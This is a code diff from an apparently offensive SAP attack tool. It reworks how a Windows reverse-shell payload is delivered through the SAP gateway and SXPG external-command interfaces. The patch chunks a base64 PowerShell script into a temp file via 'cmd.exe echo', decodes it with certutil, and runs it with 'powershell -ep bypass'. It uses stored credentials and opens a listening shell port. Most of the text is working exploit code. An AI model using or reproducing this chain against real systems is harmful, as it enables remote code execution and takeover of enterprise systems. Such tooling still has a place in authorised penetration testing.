@@ -403,14 +403,30 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
                f"iex([Text.Encoding]::Unicode.GetString("
                f"[Convert]::FromBase64String($b)))\"")
     assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
+
+    # SXPG steps: same chunks but split into EXTPROG + PARAMS.
+    # SXPG needs binary in EXTPROG, args in PARAMS (no full cmd line).
+    sxpg_steps = []
+    for idx, chunk in enumerate(chunks):
+        redir = ">" if idx == 0 else ">>"
+        sxpg_steps.append({
+            "command": "cmd.exe",
+            "params": f"/C echo {chunk}{redir}{tmp}",
+        })
+    # Decode b64 → UTF-16LE .ps1 via certutil, then run with -f
+    sxpg_steps.append({
+        "command": "certutil.exe",
+        "params": f"-decode {tmp} {tmp}.ps1",
+    })
     return {
-        # GW path: multi-step write chunks + execute from file
+        # GW path: full command line in EXTPROG
         "steps": steps,
         "command": run_cmd,
         "params": "",
-        # SXPG path: direct via LONG_PARAMS (no temp file needed)
+        # SXPG path: split EXTPROG + PARAMS per step
+        "sxpg_steps": sxpg_steps,
         "sxpg_command": "powershell.exe",
-        "sxpg_params": f"-nop -w hidden -EncodedCommand {enc}",
+        "sxpg_params": f"-nop -ep bypass -f {tmp}.ps1",
         "display": display,
     }
 
@@ -1468,27 +1484,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"{payload['display']}")
                 print(f"    Listening on 0.0.0.0:{shell_port}")
 
-            # For SXPG with Windows multi-step payloads: skip the
-            # temp file approach. SXPG has LONG_PARAMS (unlimited
-            # STRING) so we can pass the full -EncodedCommand directly.
-            # GW needs the multi-step approach (EXTPROG is 128 bytes).
-            sxpg_direct = payload.get("sxpg_command")
-
-            if method == "sxpg" and sxpg_direct:
-                creds = node.best_credentials()
-                if not creds:
-                    print(f"[-] {sid}: No credentials for SXPG shell")
-                    with _shell_lock:
-                        if _shell_session:
-                            _shell_session.status = "error"
-                            _shell_session.error_msg = "No credentials for SXPG"
-                    return
-                print(f"[*] {sid}: Using SXPG LONG_PARAMS for payload")
-                result = sapmap_rfc.execute_local_command(
-                    node, sxpg_direct,
-                    payload.get("sxpg_params", ""), creds)
-            else:
-                # GW path: execute pre-steps (write chunks to temp file)
+            if method == "gateway":
+                # GW: full command line in EXTPROG
                 pre_steps = payload.get("steps", [])
                 if pre_steps:
                     print(f"[*] {sid}: Writing payload to temp file "
@@ -1496,23 +1493,32 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     for step in pre_steps:
                         sapmap_exploit.execute_gw_command(
                             node, step["command"], step["params"])
-
-                # Execute the main payload command
-                if method == "gateway":
-                    result = sapmap_exploit.execute_gw_command(
-                        node, payload["command"], payload["params"])
-                else:
-                    creds = node.best_credentials()
-                    if not creds:
-                        print(f"[-] {sid}: No credentials for SXPG shell")
-                        with _shell_lock:
-                            if _shell_session:
-                                _shell_session.status = "error"
-                                _shell_session.error_msg = "No credentials"
-                        return
-                    result = sapmap_rfc.execute_local_command(
-                        node, payload["command"], payload["params"],
-                        creds)
+                result = sapmap_exploit.execute_gw_command(
+                    node, payload["command"], payload["params"])
+            else:
+                # SXPG: split EXTPROG + PARAMS
+                creds = node.best_credentials()
+                if not creds:
+                    print(f"[-] {sid}: No credentials for SXPG shell")
+                    with _shell_lock:
+                        if _shell_session:
+                            _shell_session.status = "error"
+                            _shell_session.error_msg = "No credentials"
+                    return
+                sxpg_steps = payload.get("sxpg_steps", [])
+                if sxpg_steps:
+                    print(f"[*] {sid}: Writing payload via SXPG "
+                          f"({len(sxpg_steps)} steps)...")
+                    for step in sxpg_steps:
+                        sapmap_rfc.execute_local_command(
+                            node, step["command"], step["params"],
+                            creds)
+                sxpg_cmd = payload.get("sxpg_command",
+                                       payload["command"])
+                sxpg_params = payload.get("sxpg_params",
+                                          payload["params"])
+                result = sapmap_rfc.execute_local_command(
+                    node, sxpg_cmd, sxpg_params, creds)
 
             if result.get("success"):
                 print(f"[+] {sid}: Shell payload delivered")
